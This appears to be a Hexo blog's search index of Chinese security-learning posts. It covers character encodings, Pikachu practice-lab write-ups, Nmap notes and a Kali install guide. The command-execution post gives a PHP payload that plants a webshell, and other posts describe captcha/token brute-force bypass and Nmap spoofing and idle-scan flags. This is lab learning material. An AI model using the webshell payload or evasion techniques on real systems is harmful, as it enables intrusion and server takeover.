<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>关于编码方式的总结</title>
      <link href="/2022/01/14/%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A0%81/"/>
      <url>/2022/01/14/%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="各类编码总结"><a href="#各类编码总结" class="headerlink" title="各类编码总结"></a>各类编码总结</h1><h2 id="一、ascii、UTF-8、gbk"><a href="#一、ascii、UTF-8、gbk" class="headerlink" title="一、ascii、UTF-8、gbk"></a>一、ascii、UTF-8、gbk</h2><h3 id="1、ascii码"><a href="#1、ascii码" class="headerlink" title="1、ascii码"></a>1、ascii码</h3><p>ASCII 码一共规定了128个字符的编码：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/v2-976d8be2a77238a37736be97bac66497_r.jpg" alt="preview"></p><h3 id="2、UTF-8、UTF-16、UTF-32"><a href="#2、UTF-8、UTF-16、UTF-32" class="headerlink" title="2、UTF-8、UTF-16、UTF-32"></a>2、UTF-8、UTF-16、UTF-32</h3><p><em>utf（Unicode Transformation Format）</em></p><h4 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8:"></a>UTF-8:</h4><p>​    utf-8是unicode的实现方法。其编码规则如下：</p><blockquote><p>1）对于单字节的符号：字节的第一位设为0，后面7位为这个符号的 Unicode 码。因此对于英语字母，UTF-8 编码和 ASCII 码是相同的；</p><p>2）对于n字节的符号（n &gt; 1）：第一个字节的前n位都设为1，第n + 1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的 Unicode 码。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/v2-6c143515986d542f67de787d85131ea9_r.jpg" alt="preview"></p><p><strong>举例说明：</strong></p><p>选择汉字“鲁”，在<code>unicode</code>官网查询其编码为<code>U+9C81</code></p><p>转换为二级制数字即为：1001 1100 1000 0001，大小两字节。</p><p>​    根据上表，“鲁”字在第三个范围内，其表示即为1110xxxx 10xxxxxx 10xxxxxx，故将前文中的二进制数字填入，即为：11101001 10110010 10000001，再转换为十六进制，即为E9B281。</p><p><strong>特征码：</strong></p><p><em>BOM（byte order mark）</em></p><p>​    在较早的Windows环境下，系统为了能够识别UTF-8这一编码格式，为UTF-8添加了<u>代表其格式的EF BB BF三位特征码（BOM）</u>，而后较高的Windows版本中，系统默认使用UTF-8这一编码格式，不再添加特征码(BOM)。经实验，若将XP环境下创建的、带有BOM的文件在Win10下打开，右下角会显示“带有BOM的UTF-8”字样，文件依然可以正常操作。</p><p><strong>优点、缺点</strong></p><p>缺点：</p><pre><code> 1. 英语国家用起来省空间，其他国家（语言）反而更费空间（汉字有可能需要三个字节） 2. 变长的储存方式导致执行索引效率低，有时需要转化为`UTF-16`或者`UTF-32`</code></pre><p>优点：</p><pre><code>1. 字符空间大于UTF-16；1. 不存在大小端序；1. 容错率高，容易检查出错误；</code></pre><h4 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16:"></a>UTF-16:</h4><p>即，使用两字节表示unicode的编码方法，有以下几个问题：</p><ol><li>大小端序的设置容易导致乱码；</li><li>两字节只能表示六万多个字符，不够用；</li><li>容错低，一处出错，后面全错；</li></ol><p><strong>端序：</strong></p><p>指字符按照什么顺序储存，与编码后内容一样即大端序，相反则小端序。</p><p>试举一例，一个“奎”的Unicode编码是594E，“乙”的Unicode编码是4E59。如果我们收到UTF-16字节流“594E”，那么这是“奎”还是“乙”？如果BOM是大端序，那么代码点就应该是594E，那么就是“奎”，如果BOM是小端序，那么代码点就应该是4E59，就是“乙”了。</p><h4 id="UTF-32："><a href="#UTF-32：" class="headerlink" title="UTF-32："></a>UTF-32：</h4><p>使用四字节表示Unicode的编码方式，占空间比较大。</p><h4 id="特征码（附）："><a href="#特征码（附）：" class="headerlink" title="特征码（附）："></a>特征码（附）：</h4><blockquote><p>有编码对应的开头标志：</p><p><code>EF BB BF　　　 UTF-8 FE FF　　　　 　UTF-16/UCS-2, little endian FF FE　　　　 　UTF-16/UCS-2, big endian FF FE 00 00　　UTF-32/UCS-4, little endian. 00 00 FE FF　　UTF-32/UCS-4, big-endian.</code></p></blockquote><h3 id="3、GBK-GB2312"><a href="#3、GBK-GB2312" class="headerlink" title="3、GBK/GB2312"></a>3、GBK/GB2312</h3><blockquote><p>​    GB全称GuoBiao国标，GBK全称GuoBiaoKuozhan国标扩展。GB18030编码兼容GBK，GBK兼容GB2312，其实这三种编码有着非常深厚的渊源，我们放在一起进行比较。 【GB2312】最早一版的中文编码，每个字占据2bytes。由于要和ASCII兼容，那这2bytes最高位不可以为0了(否则和ASCII会有冲突)。在GB2312中收录了6763个汉字以及682个特殊符号，已经囊括了生活中最常用的所有汉字。</p></blockquote><p>​    总结来说，GBK就是两个字节组成的汉字字符集，同时其通过不让第一个字节为0的方式来兼容ascii码。实际上，有很多比较生僻的名字打不出来就是由于未被GB2312收录的原因。</p><p><strong>全角&amp;半角</strong>：</p><p>在GBK中，也收录了一些数字和字母，即ascii表中有的字母和数字，被GBK又收录了一遍。</p><p><u>那么，当我们直接使用ASCII码，用一个字节来表示数字和字母，就称之为<strong>半角</strong>；</u></p><p><u>若使用GBK中收录的那份数字和字母，用两个字节来表示数字和字母，就称之为<strong>全角</strong>；</u></p><p>通常我们使用半角，因为全角可能在编程过程中导致编译器不认识。</p><p><strong>big5</strong></p><p>big5是台湾搞出来的一种包括繁体的编码方式，与GBK不兼容。</p><p><strong>GB18030</strong></p><p>为了收录比GBK还多的汉字，使用四个字节来表示一个汉字，越来越复杂。</p><p>​    由于汉字编码方式不断迭代，迭代的同时又要保持兼容，GBK和GB2312比ASCII多出来的字都是2bytes，GB18030比GBK多出来的字都是4bytes，而ASCII、GB2312、GBK、GB18030直接有需要保持兼容性，最终就形成了被人诟病的国标汉字编码形式，具体可以参考下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/20645acf6cdf2aa38922bcfbeb676922.png" alt="20645acf6cdf2aa38922bcfbeb676922.png"></p><h2 id="二、乱码的来源"><a href="#二、乱码的来源" class="headerlink" title="二、乱码的来源"></a>二、乱码的来源</h2><h3 id="1、Unicode与国标的不兼容性"><a href="#1、Unicode与国标的不兼容性" class="headerlink" title="1、Unicode与国标的不兼容性"></a>1、Unicode与国标的不兼容性</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/a74eccea4783314561c09e8b3100eb65.png" alt="a74eccea4783314561c09e8b3100eb65.png"></p><p>只兼容ASCII部分。</p><h3 id="2、锟斤拷"><a href="#2、锟斤拷" class="headerlink" title="2、锟斤拷"></a>2、锟斤拷</h3><p>虽然<code>Unicode</code>号称万国码，但是依然有未收录的字符，同时每个地区或操作系统对字符的支持程度也是不同的，因此在<code>Unicode</code>中就有一个特殊字符来代表未知字符：�</p><p>它的<code>Unicode</code>编码为<code>0xFFFD</code>。</p><p>将其<code>Unicode</code>编码转化为<code>UTF-8</code>后，十六进制表示为<code>0xEF 0XBF 0XBD</code></p><p>若同时出现两个乱码符号，转化为十六进制就是<code>0xEF 0XBF 0XBD 0xEF 0XBF 0XBD</code></p><p>这时候再将其强行转码为<code>GBK</code>编码，因为GBK中用两个字节表示一个字符，那么上述的字符就成了<strong>锟</strong>（0xEFBF），<strong>斤</strong>（0xBDEF），<strong>拷</strong>（0xBFBD）。</p><h3 id="3、烫烫烫、屯屯屯、葺葺葺（qi四声）"><a href="#3、烫烫烫、屯屯屯、葺葺葺（qi四声）" class="headerlink" title="3、烫烫烫、屯屯屯、葺葺葺（qi四声）"></a>3、烫烫烫、屯屯屯、葺葺葺（qi四声）</h3><p>Visual Studio中，未初始化的栈空间（即静态分配的空间）用0xCC填充，而未初始化的堆空间（即动态分配的空间）用0xCD填充。</p><p>而0xCCCC和0xCDCD在中文GB2312编码中分别对应“烫”字和“屯”字。</p><p>如果一个字符串没有结束符’\0’，输出时就会打印出未初始化的栈或堆空间的内容，这就是大名鼎鼎的“烫烫烫”、“屯屯屯”乱码。</p><p>而分配了，又被删除的内存，使用0xDDDD来填充，对应“葺”字。</p><h2 id="三、base-XX编码是什么"><a href="#三、base-XX编码是什么" class="headerlink" title="三、base XX编码是什么"></a>三、base XX编码是什么</h2><h3 id="1、base-64、32、16编码流程"><a href="#1、base-64、32、16编码流程" class="headerlink" title="1、base 64、32、16编码流程"></a>1、base 64、32、16编码流程</h3><p>例如要被编码的字符串是：<code>ILU</code></p><ol><li><p>第一步：将 <code>ILU</code> 字符串中的每一个字符转为对应于 <code>Ascii</code> 编码表的值，I = 73, L = 76, U = 85。</p></li><li><p>第二步：将第一步中的 <code>Ascii</code> 值分别转为对应的<code>二进制</code>格式，要求必须是造成<code>8bit</code>，不足8比特位高位补0。例如：1 的二进制是 1，明显不够8位，最终应该显示为:<code>0000 0001</code>。<code>ILU</code> 的转化结果以下：</p><blockquote><p>73 = 01001001</p></blockquote><blockquote><p>76 = 01001100</p></blockquote><blockquote><p>85 = 01010101</p></blockquote></li><li><p>第三步：根据<code>base X</code>(这里的 X 表明 16，32，64等编号) 编码算法中所指定的<code>y 个 bit 位为一个字符在表格中的下标</code> 的规则，对第2步的进行划分。例如 <code>base 16</code>的规则要求，4位做为一个下标对应一个字符，即每4个位为一部分，故划分以下：</p><blockquote><p>第1部分：0100 是 (73 = 01001001，的前4个位)</p></blockquote><blockquote><p>第2部分：1001 是 (73 = 01001001，的后4个位)</p></blockquote><blockquote><p>第3部分：0100</p></blockquote><blockquote><p>第4部分：1100</p></blockquote><blockquote><p>第5部分：0101</p></blockquote><blockquote><p>第6部分：0101</p></blockquote></li><li><p>第四步：将第三步中划分出的<code>每一个部分</code>进行<code>10进制转换</code>，得出对应于10进制数的<code>下标值</code>，以下：</p><blockquote><p>0100 = 4，1001 = 9，4，12，5，5</p></blockquote></li><li><p>第五步：最后一步，将第4步中得出的<code>下标数</code>去<code>查表</code>，得出对应的字符，<code>连在一块儿，就是编码结果</code></p></li></ol><p>​    总结来说，对于16、32、64的<code>base X</code>编码，将内容转化为二进制，分别按<code>4、5、6</code>位分组，然后转化为字符形式即可，其中：</p><table><thead><tr><th align="center">名称</th><th align="left">下标数字的位个数</th><th align="left">编码表字符串</th><th align="left">位数不足是否会补全 =</th></tr></thead><tbody><tr><td align="center">base 16</td><td align="left">4</td><td align="left">数字0<del>9 和 字母 A</del>F</td><td align="left">不会，位数恰好是 4 的倍数</td></tr><tr><td align="center">base 32</td><td align="left">5</td><td align="left">大写字母A<del>Z 和 数字2</del>7</td><td align="left">会</td></tr><tr><td align="center">base 64</td><td align="left">6</td><td align="left">大写字母A<del>Z，小写字母a</del>z，数字0~9以及”+”，”/“</td><td align="left">会</td></tr></tbody></table><p>​    在编码后，base 16的字符数量会变为两倍；base 32会变为5/8倍；base 64会变为4/3倍。</p><h3 id="2、对base-2-n-编码尝试进行计算"><a href="#2、对base-2-n-编码尝试进行计算" class="headerlink" title="2、对base 2^n 编码尝试进行计算"></a>2、对base 2^n 编码尝试进行计算</h3><p>以字符串<code>Lhl_2507</code>为例：</p><p>以<code>utf-8</code>的形式编码为<code>十六进制</code>：<code>4c686c5f32353037</code>；</p><p>转化为二进制数：<code>0100 1100 0110 1000 0110 1100 0101 1111 0011 0010 0011 0101 0011 0000 0011 0111</code>；</p><p>然后分别按照4、5、6位分组：</p><p>​    其中base 16的结果就等同于<code>utf-8</code>的十六进制格式：<code>4c686c5f32353037</code>；</p><p>​    按照<code>五位</code>分组：<code>01001 10001 10100 00110 11000 10111 11001 10010 00110 10100 11000 00011 0111</code></p><p>​    按照<code>A~Z 2~7</code>分别对应<code>0~31</code>(五位二进制转十进制)，进行转化：<code>JRUGYXZSGUYD</code>为前十二位</p><p>​    最后一位需要补全，先补<code>0</code>变为二进制<code>01110</code>对应base 32中的<code>O</code></p><p>​    为了与十六进制统一，需要补充<code>=</code>作为字符数量，前面<code>5*4=20</code>的组合有三组，最后多余一组，因此补充三个<code>=</code></p><p>​    最终结果为<code>JRUGYXZSGUYDO===</code></p><p>​    base 64与base 32思路相同</p><p>​    其64位数分别对应<code> A~Z a~z 0~9 + /</code>用来对应0~63的十进制数</p><p>​    转化结果为<code>TGhsXzI1MDc=</code></p><h3 id="3、非2-n的base-XX编码"><a href="#3、非2-n的base-XX编码" class="headerlink" title="3、非2^n的base XX编码"></a>3、非2^n的base XX编码</h3><h4 id="base-58编码："><a href="#base-58编码：" class="headerlink" title="base 58编码："></a>base 58编码：</h4><blockquote><p>​    base58编码去掉了几个看起来会产生歧义的字符，如 0 (零), O (大写字母O), I (大写的字母i) and l (小写的字母L) ，和几个影响双击选择的字符，如/, +。结果字符集正好58个字符(包括9个数字，24个大写字母，25个小写字母)。</p><p>​    同时，由于58 不是2的整次幂，所以无法使用类似base64编码中使用直接截取3个字符转4个字符（3*8=4*6 , 2的6次方刚好64）的方法进行转换，而是采用我们数学上经常使用的进制转换方法——辗转相除法（本质上，base64编码是64进制，base58是58进制）。看下base58的编码表：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/20180620000601834" alt="img"></p><p>​    试举一例，若要将<code>Lhl</code>字符在utf-8编码下转化为base 58的形式：</p><p>​    转化为十六进制：<code>4c686c</code></p><p>​    十六进制转十进制：<code>5007468</code></p><p>​    十进制转58进制：辗转相除，然后将<code>58进制数字</code>转化为上表的表示形式即可。</p><p>​    结果为：<code>E3QvX8qx</code></p><h4 id="base-91编码："><a href="#base-91编码：" class="headerlink" title="base 91编码："></a>base 91编码：</h4><blockquote><p>​    base91是一种将二进制数据编码为ASCII字符的高级方法。它类似于uuencode或base64，但效率更高。base91产生的开销取决于输入数据。它的数量最多为23%（而base64为33%），其范围可以降低到14%，这通常发生在0字节块上。这使得base91在通过电子邮件或终端线路等二进制不安全连接传输较大文件时非常有用。</p><p>​    顾名思义，base91需要91个字符来表示用ASCII编码的二进制数据。在94个可打印的ASCII字符（0x21-0x7e）中，以下三个字符被省略以构建base91字母表：</p><p>​    -（破折号，0x2d）</p><p>​    \（反斜杠，0x5C）</p><p>​    ‘（撇号，0x27）</p><p>​    翻译表由如下所示的其余字符组成。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/20190816091541986.png" alt="img"></p><p>引用（参考）：</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pikachu_命令执行</title>
      <link href="/2022/01/11/PIKACHU%E9%80%9A%E5%85%B3_DAY2_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/01/11/PIKACHU%E9%80%9A%E5%85%B3_DAY2_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="PIKACHU通关-命令执行"><a href="#PIKACHU通关-命令执行" class="headerlink" title="PIKACHU通关_命令执行"></a>PIKACHU通关_命令执行</h1><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。<br>比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 但是如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p><h2 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h2><p>windows系统和<a href="https://so.csdn.net/so/search?q=linux">linux</a>系统各有4个，其中3个是共有的，各有1个是特有的：</p><ul><li>windows系统：| 、||、&amp;&amp;、&amp;</li><li>linux系统：| 、||、&amp;&amp;、;</li></ul><p>总结一下各连接符号的作用：</p><ol><li> |    管道符，用于把前一个命令的输出作为下一个命令的输入；</li><li> || 逻辑或，只有前一个命令成功，后一个就不执行，反之后一个执行；</li><li> &amp;&amp;逻辑与，只有前一个执行成功才执行后一个，否则不执行；</li><li> &amp; Windows独有，顺序执行每一条命令；</li><li> ；Linux独有，顺序执行每一条命令；</li></ol><h2 id="测试常用命令"><a href="#测试常用命令" class="headerlink" title="测试常用命令"></a>测试常用命令</h2><p><code>whoami</code>命令（Who am i），用于区分Windows和Linux环境：</p><p>（前者有两个参数，用”\“隔开，后者只显示用户名）</p><h2 id="PIKACHU-exec’ping’"><a href="#PIKACHU-exec’ping’" class="headerlink" title="PIKACHU_exec’ping’"></a>PIKACHU_exec’ping’</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111170123070.png" alt="image-20220111170123070"></p><p>没有任何过滤，随便乱杀。</p><h2 id="PIKACHU-exec’eval’"><a href="#PIKACHU-exec’eval’" class="headerlink" title="PIKACHU_exec’eval’"></a>PIKACHU_exec’eval’</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111210928950.png" alt="image-20220111210928950"></p><p>一样没有任何过滤，可以直接使用<code>phpinfo();</code>进行测试，</p><p>或者构造payload<code>fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php assert($_POST[lhl_2507]);?&gt;&#39;);</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pikachu_暴力破解</title>
      <link href="/2022/01/11/PIKACHU%E9%80%9A%E5%85%B3_DAY1_%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
      <url>/2022/01/11/PIKACHU%E9%80%9A%E5%85%B3_DAY1_%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="PIKACHU通关-暴力破解"><a href="#PIKACHU通关-暴力破解" class="headerlink" title="PIKACHU通关_暴力破解"></a>PIKACHU通关_暴力破解</h1><p>暴力破解需要将表单传到 <strong>Intruder</strong>(入侵者)模块</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111100429372.png" alt="image-20220111100429372"></p><p>在这里记录一下四种四种<strong>AttackType</strong>:</p><ul><li><p><strong>Sinper</strong>（狙击手）:</p><p>输入一个字典，分别对每一个被标记的位置用此字典遍历。</p></li><li><p><strong>Battering ram</strong>（攻城槌）：</p><p>输入一个字典，同时对每一个被标记的位置用此字典遍历。</p></li><li><p><strong>Pitchfork</strong>（干草叉）</p><p>输入多个字典，按照顺序，从上到下对应遍历。（以最短的字典长度为遍历次数）</p></li><li><p><strong>Cluster bomb</strong>（集束炸弹）</p><p>输入多个字典，遍历所有可能性，排列组合。</p></li></ul><h2 id="第一关——普通爆破"><a href="#第一关——普通爆破" class="headerlink" title="第一关——普通爆破"></a>第一关——普通爆破</h2><p>回到暴力破解，我们使用<strong>Cluster bomb</strong>进行字典爆破：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111103021323.png" alt="image-20220111103021323"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111103527752.png" alt="image-20220111103527752"></p><p>分别对用户名和密码的爆破上传字典，<strong>若用户名和密码有特殊字符需求，不勾选URL-encoding:</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111103740053.png" alt="image-20220111103740053"></p><p>点击开始爆破，观察返回报文的长短即可。</p><h2 id="第二关——绕过验证码（ON-SERVER）"><a href="#第二关——绕过验证码（ON-SERVER）" class="headerlink" title="第二关——绕过验证码（ON SERVER）"></a>第二关——绕过验证码（ON SERVER）</h2><p><strong>观察：</strong></p><p>发现页面首先验证验证码的正确性，然后验证用户名和密码。</p><p>同时进行抓包，发现验证码是后端验证。</p><p>但是本关的问题在于，只要不点击网页上的login按钮，验证码就不会刷新，因此使用发包的方式一直爆破即可。</p><p><strong>源码分析：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111111050870.png" alt="image-20220111111050870"></p><p>其一，在验证后，应重置验证码。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111111359414.png" alt="image-20220111111359414"></p><p>其二，不应将验证码作为cookie返回前端</p><h2 id="第三关——绕过验证码（ON-CLIENT）"><a href="#第三关——绕过验证码（ON-CLIENT）" class="headerlink" title="第三关——绕过验证码（ON CLIENT）"></a>第三关——绕过验证码（ON CLIENT）</h2><p>右键查看源代码：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111144849999.png" alt="image-20220111144849999"></p><p>发现验证码在前端验证。</p><h2 id="第四关——token防止爆破"><a href="#第四关——token防止爆破" class="headerlink" title="第四关——token防止爆破"></a>第四关——token防止爆破</h2><p>添加了token防止爆破，抓包进行观察，可以发现返回的包中含有下一次的token值。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111145923138.png" alt="image-20220111145923138"></p><p>因此，我们使用正则提取出token强行爆破：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111150453621.png" alt="image-20220111150453621"></p><p>使用正则表达式（Recursive grep）进行匹配，正则添加方法如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111150832658.png" alt="image-20220111150832658"></p><p>可以使用右边的Refetch response按钮确认报文中有多少符合此正则的位置。</p><p>因此可见，使用token防爆破还是没啥用。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Nmap使用笔记</title>
      <link href="/2022/01/08/Nmap%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/01/08/Nmap%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="NMAP使用笔记"><a href="#NMAP使用笔记" class="headerlink" title="NMAP使用笔记"></a>NMAP使用笔记</h1><p>NMAP的作用是在信息收集阶段进行端口扫描。</p><h2 id="一、端口扫描："><a href="#一、端口扫描：" class="headerlink" title="一、端口扫描："></a>一、端口扫描：</h2><p>要给sudo权限</p><p><code>namp xx.com -p 80 -sS</code>（syn扫描方式）</p><p>此外还有-sS/sT/sA/sW/sM 分别对应SYN/Connect()/ACK/window/Maimon</p><p>-sU对应UDP</p><p>-sN/sF/sX对应TCP null/FIN/Xmas</p><p>加 <code>-sV -O</code>可以扫描主机版本 ，操作系统等等信息</p><p><code>namp xx.com -p 80 -A</code>效果相同（推荐） </p><p>扫描所有端口：<code>namp xx.com -A -sS</code>(不讲武德，推荐) </p><p>使用<code> -iR</code>随机扫描域名</p><p>扫描五个最常见的端口 <code>nmap xx.com --top-ports 5</code></p><p>输出到文件<code>-oN [文件路径+文件名]</code></p><p>脚本扫描<code>--script=[文件路径./...+文件名]</code></p><h2 id="二、防火墙欺骗："><a href="#二、防火墙欺骗：" class="headerlink" title="二、防火墙欺骗："></a>二、防火墙欺骗：</h2><p><code>-D1.1.1.1,2.2.2.2</code>冒充其他IP发包（伪造IP）</p><p><code>-g996</code>冒充其他源端口号（伪造端口）</p><p><code>--spoof-mac [MAC地址]</code>冒充其他mac地址</p><p><code> namp -iflist</code>输出正在使用的网络信息</p><p>还可以使用空闲扫描，使用网络上其他的空闲主机进行扫描：</p><p>先发现空闲主机：<code>sudo nmap --script ipedseq -iR 1000 -oN ipidseq.txt</code>(扫描一千个主机，输出到文件)</p><p>扫描结束后，使用空闲主机的ip和端口，使用命令：</p><p><code>nmap -Pn -sI [空闲IP:空闲端口] [目标IP]</code></p><p>​    </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kali安装</title>
      <link href="/2022/01/06/kali%E8%A3%85%E6%9C%BA%E8%BF%87%E7%A8%8B/"/>
      <url>/2022/01/06/kali%E8%A3%85%E6%9C%BA%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="kali装机过程"><a href="#kali装机过程" class="headerlink" title="kali装机过程"></a>kali装机过程</h2><p>磁盘管理</p><p>设别管理器</p><p>系统信息</p><p>下载系统iso文件 rufus 3.14 将内容刻录到u盘</p><p>关机开机后，按住F1</p><p>进入bios窗口，选Security  进入Security Boot 将Secure Boot改为Disabled</p><p>F10退出 按住F12 进入Boot Menu 选使用用来装机的USB设备，回车</p><p>进入kali界面，卡了一下，等待</p><p>图形化安装，选择语言和国家</p><p>安装完毕后，连接WIFI</p><p>磁盘分区，选择整个磁盘（前提是备份电脑中的所有内容），选择电脑（最大的）的磁盘</p><p>放在同一分区下，确定后选择“是”要更改</p><p>最后一步，直接重启，先不拔出USB</p><p>拔出USB后，需要对u盘重新分区，使用windows的diskpart命令和磁盘管理。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/01/04/hello-world/"/>
      <url>/2022/01/04/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
